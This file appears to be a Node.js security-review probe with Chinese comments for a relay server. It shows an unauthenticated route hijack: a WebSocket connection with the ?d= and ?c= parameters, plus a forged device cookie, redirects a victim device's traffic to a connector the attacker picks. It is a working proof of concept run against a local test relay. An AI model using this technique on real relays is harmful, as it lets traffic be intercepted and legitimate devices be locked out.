/**
 * Pair-Proof 方案审查探针：证明中继设备路由表存在**第二个未认证写入口**。
 *
 * 动因：Pair-Proof 把「设备归属」的写入口收口到 device-claim（验签），但它只覆盖了
 *   `devices` 帧这一条路径（relay/server.mjs:786）。onPhoneSocket 里还有一条直接
 *   写表的分支（relay/server.mjs:857、861）：
 *
 *     claimedDeviceId = url.searchParams.get('d') ?? cookieHint ?? `pair-<random>`
 *     if (!entry || entry.connectorId !== connectorId) devices.set(claimedDeviceId, {…})
 *
 *   `?d=` 是**未经任何认证的 URL 参数**，`?c=` 也是；两者都来自任意公网客户端。
 *   于是任何人只要知道「victim 的 deviceId + 一个在线 connectorId」，就能把该设备
 *   的路由改到自己（或任意）连接器上 —— 无需 token、无需任何私钥、无需有效签名，
 *   而 claim 让配对那一刻的归属变成**永久事实**（旧签名只绑 connectorId、不绑时间），
 *   于是攻击者一次写入即可长期占位，正当连接器反而再也抢不回来。
 *
 * 运行：node route-hijack.probe.mjs        （自起中继子进程，结束自动清理）
 *
 * 2026-10-02 实测输出：
 *   === 基线 ===            正当请求 → A(正当 owner)
 *   === 攻击 ===            攻击期间同一请求 → B(攻击者选定)
 *   === 攻击者断开后 ===    断连后同一请求 → 无人收到；devices 表 1 → 0
 */
import { spawn } from 'node:child_process';
import { createRequire } from 'node:module';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const require = createRequire(path.join(HERE, 'relay') + path.sep);
const WebSocket = require('ws');

const SERVER = path.join(HERE, 'relay', 'server.mjs');
const TOKEN = 'audit-token-xyz';
const A_ID = 'aaaa1111aaaa1111aaaa1111aaaa1111';
const B_ID = 'bbbb2222bbbb2222bbbb2222bbbb2222';
const VICTIM = 'victim01';

const child = spawn(process.execPath, [SERVER], {
  env: { ...process.env, PORT: '0', RELAY_TOKENS: TOKEN },
  stdio: ['ignore', 'pipe', 'pipe']
});
child.stderr.on('data', (chunk) => {
  const text = String(chunk);
  if (!/\[dbg\]/.test(text)) process.stderr.write(`[relay] ${text}`);
});

const port = await new Promise((resolve, reject) => {
  const timer = setTimeout(() => reject(new Error('relay start timeout')), 8000);
  child.stdout.on('data', (chunk) => {
    const match = /listening on [^ ]+:(\d+)/.exec(String(chunk));
    if (match) { clearTimeout(timer); resolve(Number(match[1])); }
  });
});

const b64u = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');

/** 起一个「正当」连接器（带 token，模拟真机部署里的连接器 A）。 */
function connector(id) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(`ws://127.0.0.1:${port}/connector?c=${id}`, ['ra.v1', `ra-bearer.${TOKEN}`]);
    const heads = [];
    ws.on('message', (data, isBinary) => {
      if (isBinary) return;
      const frame = JSON.parse(String(data));
      if (frame.kind === 'hello-ack') {
        ws.send(JSON.stringify({ kind: 'hello', proto: 1, caps: ['http', 'ws', 'pair', 'auth', 'bin'] }));
        resolve({ ws, heads, id });
      }
      if (frame.kind === 'http-head') heads.push(frame);
    });
    ws.on('error', reject);
    setTimeout(() => reject(new Error(`${id} handshake timeout`)), 5000);
  });
}

const A = await connector(A_ID);
const B = await connector(B_ID);
await new Promise((r) => setTimeout(r, 150));

// 正当连接器 A 权威上报 victim（这就是真实部署里 publishDevices 做的事）
A.ws.send(JSON.stringify({ kind: 'devices', deviceIds: [VICTIM] }));
await new Promise((r) => setTimeout(r, 200));

const cookie = `ra-device=v1.${b64u({ deviceId: VICTIM })}.NOT-A-REAL-SIGNATURE`;

/** 发一个只带伪造 cookie 的普通请求，看 http-head 落进哪个连接器。 */
async function where(label) {
  A.heads.length = 0; B.heads.length = 0;
  const ac = new AbortController();
  fetch(`http://127.0.0.1:${port}/`, { headers: { cookie }, signal: ac.signal }).catch(() => {});
  await new Promise((r) => setTimeout(r, 400));
  ac.abort();
  const result = A.heads.length ? 'A(正当 owner)' : B.heads.length ? 'B(攻击者选定)' : '无人收到';
  console.log(`  ${label} → ${result}`);
  return result;
}

console.log('=== 基线 ===');
const before = await where('正当请求');

console.log('\n=== 攻击：无 token / 无 cookie 有效性 / 无签名，仅 ?d=victim01&c=<B> ===');
const evil = new WebSocket(`ws://127.0.0.1:${port}/api/remote.mux?d=${VICTIM}&c=${B_ID}`);
await new Promise((r) => evil.on('open', r));
await new Promise((r) => setTimeout(r, 300));
const during = await where('攻击期间同一请求');

console.log('\n=== 攻击者断开后 ===');
evil.close();
await new Promise((r) => setTimeout(r, 300));
const after = await where('断连后同一请求');
const health = await fetch(`http://127.0.0.1:${port}/healthz`).then((r) => r.json());

console.log('\n结果：');
console.log('  ① 实时劫持  :', before.includes('A') && during.includes('B') ? '成功（路由被改写到 B）' : '未成功');
console.log('  ② 断连后    :', after.includes('A') ? '路由恢复 A' : after.includes('B') ? '仍指向 B' : '正当设备的条目被删除');
console.log('  devices 表条目数 =', health.devices, `（A 曾权威上报 ${VICTIM}）`);

const hijacked = before.includes('A') && during.includes('B');
console.log(`\n${hijacked ? '★ 复现：设备路由表可被未认证客户端改写（Pair-Proof 未覆盖此旁路）' : '未复现'}`);

A.ws.close(); B.ws.close(); child.kill('SIGKILL');
process.exit(hijacked ? 0 : 1);
